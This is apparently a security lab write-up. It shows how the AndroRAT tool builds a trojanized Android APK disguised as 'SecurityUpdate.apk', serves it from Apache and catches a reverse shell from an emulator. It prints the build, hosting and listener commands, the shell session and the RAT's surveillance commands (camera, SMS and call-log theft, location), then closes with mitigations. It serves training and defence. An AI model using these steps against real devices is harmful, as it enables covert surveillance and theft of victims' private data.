# AndroRAT: Malicious APK Delivery & Reverse Shell

A lab demonstrating how [AndroRAT](https://github.com/karma9874/AndroRAT) can be used to build a trojanized Android APK, deliver it to a target device disguised as a legitimate update, and establish a full reverse shell with remote device control once installed.

> ⚠️ **Disclaimer:** Performed entirely in an isolated lab environment (Parrot Security attacker VM, Android emulator target) that I own and control. This technique relies on social engineering and sideloading an untrusted APK — never distribute or install APKs from unverified sources on a real device, and never build or deploy payloads against systems or people without explicit authorization.

---

## Lab Environment

| Component | Details |
|---|---|
| Attacker machine | Parrot Security OS (`10.10.1.13`) |
| Target | Android emulator (VMware Virtual Platform) |
| Payload tool | [AndroRAT](https://github.com/karma9874/AndroRAT) |
| Delivery method | Apache-hosted APK, disguised as `SecurityUpdate.apk` |
| Listener port | `4444` |

---

## 1. Building the Malicious APK

AndroRAT was used to build a backdoored APK, configured to call back to the attacker's IP (`10.10.1.13`) on port `4444`. The output was deliberately named **`SecurityUpdate.apk`** to disguise it as a legitimate system update:

```
sudo python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
```

Once built and signed, the APK was copied into Apache's web root and the web server was started, making the payload available for download over HTTP:

```
sudo cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
service apache2 start
```

![Building, signing, and hosting the AndroRAT APK via Apache](../images/androRAT.py%20--build%20-i%2010.10.1.13.png)

---

## 2. Delivering the Payload

With the file hosted, the target device browsed to `10.10.1.13/share/` — an Apache directory listing exposing `SecurityUpdate.apk` alongside several other staged payloads (`Registry.exe`, `Test.exe`, `exploit1.exe`, etc.), illustrating how easily a disguised payload blends in among other files on a basic file share.

![The target browsing to the Apache share and finding SecurityUpdate.apk](../images/security%20update%20download.png)

Once downloaded and manually installed by the target (simulating a user tricked into sideloading a "security update"), the APK's embedded listener callback fires automatically on launch.

---

## 3. Catching the Reverse Shell

Back on the attacker machine, AndroRAT's listener was started to wait for incoming connections from any installed payload:

```
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
```

The moment the APK was opened on the target, a connection was received and an interactive command interpreter dropped straight into a reverse shell:

```
Got connection from ('192.168.172.133', 39444)
Hello there, welcome to reverse shell of VMware Virtual Platform
Interpreter:/>
```

![Reverse shell session established after the APK is launched on the target](../images/welcome%20to%20reverse%20shell.png)

From the interpreter, the full command set was explored with `help`, exposing a wide range of post-exploitation capabilities — device info, camera access, audio/video recording, SMS and call log exfiltration, live shell access, geolocation, and more:

```
deviceInfo     --> returns basic info of the device
camList        --> returns cameraID
takepic        --> Takes picture from camera
startVideo     --> starts recording the video
getSMS         --> returns inbox/sent SMS in a file
getCallLogs    --> returns call logs in a file
shell          --> starts an interactive shell of the device
getLocation    --> returns the current location of the device
getMACAddress  --> returns the MAC address of the device
...
```

Running `getMACAddress` against the live session confirmed full interactive control of the compromised emulator.

![Exploring AndroRAT's full command set and running deviceInfo/getMACAddress](../images/python3%20androRAT.py%20--shell%20-i%200.0.0.0%20-p%204444.png)

---

## How This Attack Works

AndroRAT embeds a persistent background service into a legitimate-looking Android app. Once a user is convinced to sideload and open it — commonly via a disguised filename like "SecurityUpdate.apk" exploiting trust in routine OS updates — the embedded client silently connects back to the attacker's listener, handing over a full command-and-control channel. From there, the attacker has access to nearly every sensitive capability the Android permission model exposes: camera, microphone, SMS, call logs, location, and a live shell.

---

## Key Takeaways / Mitigations

- **Never sideload APKs from outside the Play Store / a trusted app store**, especially ones framed as "updates" delivered via a link or file share.
- **Disable installation from unknown sources** at the OS level unless there's a specific, verified need.
- **Scrutinize app permissions at install time** — a basic "update" requesting camera, SMS, and location access is a major red flag.
- **Use Google Play Protect / mobile EDR** to catch known RAT signatures before installation completes.
- **User awareness training** is the strongest control here — this entire attack chain depends on a human being tricked into installing and opening the file.

---

## Tools Referenced

- [AndroRAT](https://github.com/karma9874/AndroRAT) — Android Remote Access Trojan framework
- Apache HTTP Server (payload hosting)
